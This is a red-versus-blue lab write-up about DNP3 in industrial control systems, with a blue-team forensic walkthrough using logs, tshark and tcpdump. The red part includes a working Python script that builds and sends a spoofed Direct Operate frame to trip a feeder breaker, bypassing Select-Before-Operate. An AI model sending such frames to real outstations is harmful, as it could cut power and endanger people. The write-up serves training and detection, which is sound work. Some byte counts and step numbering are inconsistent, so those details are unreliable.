# DNP3 Sequence Anomaly Red vs Blue Writeup

## Red Team Writeup

# Red Team Lab Walkthrough: DNP3 Sequence Anomaly (Manual Solution)


> [!NOTE]
> **Beginner Overview: How & Why**
> This walkthrough is designed for beginners. In OT/ICS security, attacks often don't rely on software exploits (like malware), but instead abuse the actual industrial protocols (changing states, writing variables, bypassing safety logic). 
> For every step below, ask yourself **How** we are executing it (e.g., via a standard protocol tool or script) and **Why** we are doing it (e.g., to bypass a safety mechanism or achieve an unauthorized state change).

## Objective
Demonstrate an **Impair Process Control** attack (**MITRE ATT&CK for ICS: T1692.001 / TA0106**) by issuing an unauthorized, raw DNP3 command message directly to a feeder breaker outstation, bypassing the stateful Select-Before-Operate (SBO) sequence.

## Scoring Logic
The Red participant scores when:
1. The outstation's feeder breaker changes state to `OPEN`.
2. The state change is triggered by a **Direct Operate (FC 3)** command frame.
3. The command is issued from an unlisted/unauthorized master address (`66`) without a preceding **Select (FC 1)** frame.

---

## Technical Background & Vulnerability Analysis

In high-reliability industrial control systems, critical control operations (e.g., closing or opening high-voltage breakers) utilize a stateful **Select-Before-Operate (SBO)** mechanism. This is a two-phase protocol handshake designed to prevent command errors:
1. **Select Phase (FC 1):** The SCADA Master commands the outstation to reserve/arm a specific point index. The outstation verifies the point and returns a confirmation, starting an internal expiration timer (typically 10 seconds).
2. **Operate Phase (FC 4):** The SCADA Master transmits the operate command to execute the control action. The outstation executes it only if a valid, matching Select command was received within the timer window.

### Vulnerability
In this environment, the outstation simulator has two vulnerabilities:
1. **Disabled SBO Enforcement:** The outstation accepts **Direct Operate (FC 3)** commands for point index `7` (Feeder Breaker) without requiring a preceding Select handshake.
2. **Lack of Link Layer Address Verification:** The outstation processes and executes commands coming from arbitrary, unlisted Link Layer source addresses (e.g., master address `66`), even though the approved master list contains only address `1`.

---

## Step-by-Step Manual Walkthrough

### Step 1: Discover the DNP3 Service
Identify if the DNP3 outstation service is running on the network. DNP3 typically runs over TCP or UDP port **20000**.
Run an Nmap scan to verify the port state:
```bash
nmap -p 20000 127.0.0.1
```
*Expected Output:*
```text
PORT      STATE SERVICE
20000/tcp open  dnp3
```

---

### Step 2: DNP3 Frame Breakdown & Manual Construction
A DNP3 frame consists of a **Link Layer Header** followed by **Application Layer Payload Data**. Since DNP3 frames embed CRCs at multiple levels (after the 8-byte header data, and after every 16-byte block of payload), the frame must be assembled carefully.

#### 1. Link Layer Header Structure (First 10 Bytes)
| Byte Offset | Field | Value (Hex) | Description |
| :--- | :--- | :--- | :--- |
| **0 - 1** | Start Octets | `0x05 0x64` | Standard DNP3 synchronization bytes |
| **2** | Length | `0x15` | Length of remaining frame (5 bytes header info + 16 bytes payload) = 21 bytes |
| **3** | Control | `0xc4` | Frame control byte (DIR = 1, PRM = 1, FC = 4 (Unconfirmed User Data)) |
| **4 - 5** | Destination Address | `0x0a 0x00` | Outstation Address `10` (Little Endian) |
| **6 - 7** | Source Address | `0x42 0x00` | Attacker Master Address `66` (Little Endian, unauthorized) |
| **8 - 9** | Header CRC16 | `0x16 0x1f` | CRC16 checksum of bytes 0-7 (calculated and appended in Little Endian) |

#### 2. Application Layer Payload Data (16 Bytes)
The payload contains the Transport Header, Application Layer Header, and the Control Relay Output Block (CROB) object:
| Byte Offset | Field | Value (Hex) | Description |
| :--- | :--- | :--- | :--- |
| **0** | Transport Header | `0xc0` | FIN = 1, FIR = 1, Sequence = 0 |
| **1** | Application Control | `0xc2` | FIN = 1, FIR = 1, CON = 0, UNS = 0, Sequence = 2 |
| **2** | Function Code | `0x03` | **Direct Operate** command bypasses Select requirement |
| **3 - 4** | Object Group & Var | `0x0c 0x01` | Group 12, Var 1 (Control Relay Output Block - CROB) |
| **5** | Qualifier Code | `0x28` | 1-byte quantity, 2-byte index |
| **6** | Quantity | `0x01` | Operating on 1 control block |
| **7 - 8** | Point Index | `0x07 0x00` | Target Point Index `7` (Feeder Breaker) (Little Endian) |
| **9** | Control Code | `0x01` | Command code: Latch On (Trip/Open breaker in simulation) |
| **10** | Count | `0x01` | Execute command once |
| **11 - 14** | On-Time | `0x01 0x00 0x00 0x00` | Pulse On-Time (1 ms) |
| **15 - 18** | Off-Time | `0x00 0x00 0x00 0x00` | Pulse Off-Time (0 ms) |
| **19** | Status Code | `0x00` | Status parameter (Request status: `0x00` / Success) |

#### 3. Payload CRC16 (2 Bytes)
- Checksum calculated over the 16 bytes of payload data: `0xbb 0x93` (stored in Little Endian).

(IN DETAIL)
Step 2

Discover DNP3.

nmap -p 20000 127.0.0.1
Step 3

Inspect the provided PCAP.

wireshark /opt/dnp3_lab/pcap/dnp3_traffic.pcap

or

tshark -x -r /opt/dnp3_lab/pcap/dnp3_traffic.pcap | head -n 20

<img width="822" height="487" alt="image" src="https://github.com/user-attachments/assets/cd35320f-9db0-4c02-9aa2-02e0e58e43fb" />


05 64 -> The DNP3 Start Bytes. This confirms you are looking at a DNP3 frame.

15 c4 -> Length (21 bytes) and Link Control.

0a 00 -> Destination Address. Hex 0a is decimal 10. This is your Outstation.

01 00 -> Source Address. Hex 01 is decimal 1. This is the authorized SCADA Master.

(Skip the 68 58 CRC and c0 c1 transport/app control bytes)

04 -> Function Code. Hex 04 means Operate. (A value of 01 here would mean Select, and 03 is the vulnerable Direct Operate you will use in your exploit).

(Skip 0c 01 28 01 which is the Object Group, Variation, and Qualifier)

07 00 -> Point Index. Hex 07 is decimal 7. This is the specific breaker being controlled.



From the capture the participant discovers:

Source Address = 1
Destination Address = 10
Select (FC1)
Operate (FC4)
Point Index = 7

Now they understand the legitimate protocol.

Step 4

Read the whitelist.

cat /opt/dnp3_lab/whitelist.txt

Output
<img width="860" height="83" alt="image" src="https://github.com/user-attachments/assets/f0684928-eac5-4657-84e6-71037429bf86" />


APPROVED_MASTERS:
10.0.0.50 - DNP3_Master_Addr: 1

Now they know

Master 1 is legitimate.

Step 5

Read the logs.

tail -f /opt/dnp3_lab/logs/dnp3_protocol.log
<img width="862" height="578" alt="image" src="https://github.com/user-attachments/assets/47e6815c-8a8a-4f66-8570-83d74bbcdde4" />


They observe

Master Addr: 1
FC:1 Select
Index:7

Master Addr:1
FC:4 Operate
Index:7

Now they know the normal workflow.

### Step 3: Manual Execution using Python Interactive Shell
If you do not have the pre-built `red_attack.sh` helper, or if you need to perform the injection manually, you can execute the command chain in a Python REPL.

1. Launch python:
   ```bash
   python3
   ```
2. Paste the following interactive commands to construct and send the packet:
```python
import socket
import struct

# 1. CRC16 Calculation Helper (DNP3 CRC uses polynomial 0xA6BC, initialized to 0, inverted result)
def dnp3_crc16(data):
    crc = 0x0000
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return ~crc & 0xFFFF

# 2. Define Addresses and Payload
dest_addr = 10  # Outstation Address
src_addr = 66   # Attacker Master Address
payload = b'\xc0\xc2\x03\x0c\x01\x28\x01\x07\x00\x01\x01\x01\x00\x00\x00\x00'

# 3. Assemble Header
start = b'\x05\x64'
length = 5 + len(payload) # 21
control = 0xc4
hdr_data = start + bytes([length, control]) + struct.pack('<H', dest_addr) + struct.pack('<H', src_addr)
hdr_crc = struct.pack('<H', dnp3_crc16(hdr_data))

# 4. Assemble Payload with CRC (DNP3 requires CRC every 16 bytes)
payload_crc = struct.pack('<H', dnp3_crc16(payload))
full_frame = hdr_data + hdr_crc + payload + payload_crc

# 5. Connect and Transmit
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect(('127.0.0.1', 20000))
s.send(full_frame)

# 6. Receive and print outstation response
response = s.recv(1024)
print("Raw Response Hex:", response.hex())
s.close()
```

---

<img width="1131" height="47" alt="image" src="https://github.com/user-attachments/assets/a4d07765-3c80-4a7f-b468-d96677e264a8" />


### Step 4: Verify Response and Process State Change
Upon sending the packet, check the raw output in the terminal.
*   **Verification of Success Response:**
    The outstation will return a DNP3 confirmation frame containing a response header and a CROB feedback structure. If successful, the response status byte will match `0x00` (Success).
*   **Verification of State Change:**
    By checking the protocol logs, you can confirm that the outstation accepted the command:
    ```text'''
   <img width="907" height="230" alt="image" src="https://github.com/user-attachments/assets/fef99a61-d41d-4400-83fe-33436c3314c5" />

   [ANOMALY]  Master Addr: 66 | Outstation: 10 | FC: 3 (Direct Operate) | Index: 7 | Status: SUCCESS
   [PROCESS_STATE_CHANGE] Feeder Breaker (Index 7) transitioned to OPEN state.

---

## Blue Team Writeup

# Blue Team Lab Walkthrough: DNP3 Sequence Anomaly (Manual Solution)


> [!NOTE]
> **Beginner Overview: How & Why**
> This walkthrough is designed for beginners. In OT/ICS security, attacks often don't rely on software exploits (like malware), but instead abuse the actual industrial protocols (changing states, writing variables, bypassing safety logic). 
> For every step below, ask yourself **How** we are executing it (e.g., via a standard protocol tool or script) and **Why** we are doing it (e.g., to bypass a safety mechanism or achieve an unauthorized state change).

## Objective
Analyze DNP3 protocol logs and network captures to detect a protocol sequence violation, identify the unauthorized source address, determine the targeted breaker index, and document the resulting process state change.

## Scoring Logic
The Blue participant scores by correctly identifying all five forensic elements:
1. **Source Master Address:** The unlisted master link address used to transmit the control command.
2. **Function Code Sequence Anomaly:** The specific DNP3 function code used to bypass SBO sequence.
3. **Target Binary Output Point Index:** The database index of the affected binary control point.
4. **Sequence Violation Classification:** Direct Operate (FC3) bypassing Select-Before-Operate (SBO) sequence.
5. **Process State Change Timestamp/Resulting State:** The timestamp and final state of the feeder breaker.

---

## Step-by-Step Forensic Walkthrough

### Step 1: Review Approved Master Baselines
Inspect the approved master whitelist configured on the outstation system:
```bash
cat /opt/dnp3_lab/whitelist.txt
```

APPROVED_MASTERS:
10.0.0.50 - DNP3_Master_Addr: 1
```
*Forensic Finding:* The only authorized SCADA Master is address **`1`**. Any traffic from other addresses commanding the outstation is rogue or unauthorized.

---

### Step 2: Analyze Protocol Logs for Sequence Anomalies
Inspect the historical log file generated by the DNP3 outstation process:
```bash
cat /opt/dnp3_lab/logs/dnp3_protocol.log
```
*Log Snippet Analysis:*
1. **Normal Baseline Traffic:**
   ```text
   2026-06-19 16:09:09 [BASELINE] Master Addr: 1 | Outstation: 10 | FC: 1 (Select) | Index: 7
   2026-06-19 16:09:10 [BASELINE] Master Addr: 1 | Outstation: 10 | FC: 4 (Operate) | Index: 7 | Status: SUCCESS
   ```
   *Analysis:* The authorized Master `1` follows the standard stateful Select-Before-Operate (SBO) sequence: a **Select (FC 1)** is sent to index `7` to arm it, followed by an **Operate (FC 4)** to execute.

2. **Rogue Traffic & Anomaly:**
   ```text
   2026-06-19 16:09:13 [ANOMALY]  Master Addr: 66 | Outstation: 10 | FC: 3 (Direct Operate) | Index: 7 | Status: SUCCESS
   2026-06-19 16:09:13 [PROCESS_STATE_CHANGE] Feeder Breaker (Index 7) transitioned to OPEN state.
   ```
   *Analysis:* Master `66` (unauthorized) bypassed the SBO handshake completely by transmitting a **Direct Operate (FC 3)** command frame to point index `7`. The outstation immediately executed this, transitioning the Feeder Breaker to `OPEN` (tripped).

---

### Step 3: Network PCAP Analysis using TShark
To perform a network-level forensic investigation, inspect the PCAP capture file `/opt/dnp3_lab/pcap/dnp3_traffic.pcap`.

1. **Identify Unique DNP3 Master Source Addresses:**
   ```bash
   tshark -r /opt/dnp3_lab/pcap/dnp3_traffic.pcap -Y "dnp3" -T fields -e dnp3.src | sort -u
   ```
   *Expected Output:*
  
<img width="917" height="152" alt="image" src="https://github.com/user-attachments/assets/817f85f8-2a95-4d99-a1bf-381ab2063988" />

*Forensic Finding:* Master Address `66` is present in the network traffic but does not exist in the whitelist.

2. **Locate the Sequence Anomaly (Function Code 3):**
   ```bash
   tshark -r /opt/dnp3_lab/pcap/dnp3_traffic.pcap -Y "dnp3.al.func == 3" -T fields -e frame.number -e frame.time -e dnp3.src -e dnp3.dst -e dnp3.al.func -e dnp3.al.index
   ```
   *Expected Output:*
   ```text'''
<img width="922" height="103" alt="image" src="https://github.com/user-attachments/assets/5202633b-c87f-4bb5-a43d-cf087028967d" />

   *Forensic Finding:* Frame analysis validates that Master `66` sent a single Function Code `3` (Direct Operate) packet 
---

### Step 4: Network PCAP Analysis using Raw TCPDump Hex Decoding
If parser tools like Wireshark/tshark are unavailable, you can manually isolate and decode the malicious DNP3 packet using tcpdump.

1. **Filter DNP3 packets and display raw hex/ASCII payload:**
   ```bash
   tcpdump -r /opt/dnp3_lab/pcap/dnp3_traffic.pcap -XX -nn tcp port 20000
   ```
2. **Locate the rogue DNP3 frame in the output:**
   ```text
   0x0000:  0000 0000 0000 0000 0000 0000 0800 4500  ..............E.
   0x0010:  004b 63df 4000 4006 97e9 7f00 0001 7f00  .Kc.@.@.........
   0x0020:  0001 e9e4 4e20 a15c 8c7e b492 8cc6 8018  ....N .\.~......
   0x0030:  01f5 fe3f 0000 0101 080a 7c4e fff9 7c4e  ...?......|N..|N
   0x0040:  fff9 0564 15c4 0a00 4200 161f c0c2 030c  ...d....B.......
   0x0050:  0128 0107 0001 0101 0000 0000 0000 bb93  .(..............
   ```
3. **Manual Decode of the DNP3 Payload (starting at offset `0x0043`):**
   - `05 64` (Start octets)
   - `15` (Length = 21 bytes)
   - `c4` (Control byte)
   - `0a 00` (Destination Address = `10` / Outstation)
   - `42 00` (Source Address = `66` in Little Endian Hex -> `0x0042` = `66` decimal / Unauthorized Master)
   - `16 1f` (Header CRC16)
   - `c0` (Transport layer)
   - `c2` (Application control)
   - `03` (Function Code = **`3` (Direct Operate)**)
   - `0c 01` (Object Group 12, Var 1 -> Control Relay Output Block)
   - `28` (Qualifier = 1-byte quantity, 2-byte index)
   - `01` (Quantity = 1)
   - `07 00` (Point Index = **`7`** / Feeder Breaker)
   - `01` (Control Code = Latch On)

---

